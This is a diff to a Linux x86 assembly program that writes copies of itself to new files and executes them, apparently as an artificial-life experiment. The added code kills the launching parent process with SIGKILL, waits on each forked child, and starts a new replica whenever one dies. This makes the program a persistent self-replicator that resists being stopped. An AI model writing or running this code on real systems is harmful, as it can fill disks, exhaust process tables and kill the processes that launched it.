@@ -78,6 +78,15 @@ inc_fname:      mov     ebx, fname              ; Move the pointer to filename i
                 mov     ebx, fname              ; Fix ebx into beginning of filename
                 ret
 
+kill_parent:    mov     eax, 64                 ; 64 = sys_getppid
+                int     0x80                    ; sys_getppid()
+
+                mov     ebx, eax                ; Move parent PID to ebx
+                mov     eax, 37                 ; 37 = sys_kill
+                mov     ecx, 9                  ; 9 = SIGKILL
+                int     0x80                    ; sys_kill(PID, SIGKILL)
+                ret
+
 run:            mov     eax, 11                 ; 11 = sys_execve
                 mov     ebx, fname              ; command
                 mov     ecx, 0                  ; no arguments
@@ -88,8 +97,15 @@ run:            mov     eax, 11                 ; 11 = sys_execve
 fork:           mov     eax, 2                  ; 2 = sys_fork
                 int     0x80                    ; sys_fork()
 
-                cmp     eax, 0                  ; if eax is zero we are in the in fork
+                cmp     eax, 0                  ; if eax is zero we are in the fork
                 jz      run                     ; jump to run if eax is zero
+                mov     ebx, eax                ; Move child PID to ebx
+                mov     eax, 7                  ; 7 = sys_waitpid
+                mov     ecx, 0                  ; status storage = NULL
+                mov     edx, 0                  ; options = WEXITED
+                int     0x80                    ; sys_waitpid(PID, NULL, WEXITED)
+
+                call    replicate               ; if child process died replicate again
                 ret
 
 rand_byte:      mov     ebx, program            ; Move the cursor to the beginning of the program
@@ -165,14 +181,7 @@ mutate:         rndNum  0, 99                   ; Generate random number between
                 jmp     grow                    ; 15% : grow the program randomly
                 ret
 
-evolve:         rndNum  0, 1                    ; Generate random number between 0 and 1
-                cmp     eax, 1                  ; if generated random number is 1 mutate
-                jz      mutate                  ; jump to mutate if eax is zero
-                ret
-
-replicate:      mov     esi, programsize        ; move programsize into esi (only increment or decrement this)
-                mov     edi, filesize           ; Move filesize into edi (only increment or decrement this)
-                call    evolve                  ; evolve
+replicate:      ; call    mutate                  ; mutate
                 mov     eax, 5                  ; 5 = sys_open
                 call    inc_fname               ; increment the filename
                 mov     ecx, 65                 ; 65 = O_WRONLY | O_CREAT
@@ -194,9 +203,11 @@ exit:           mov     bl, 0                   ; 0 = Exit code
                 mov     al, 1                   ; 1 = sys_exit
                 int     0x80                    ; sys_exit(0)
 
-_start:         call    program
-                call    replicate
-                call    replicate
+_start:         mov     esi, programsize        ; Move programsize into esi (only increment or decrement this)
+                mov     edi, filesize           ; move filesize into edi (only increment or decrement this)
+                call    program
+                call    kill_parent
+                call    replicate               ; replicate subroutine must not fail!
                 call    exit
 
 filesize        equ     $ - $$
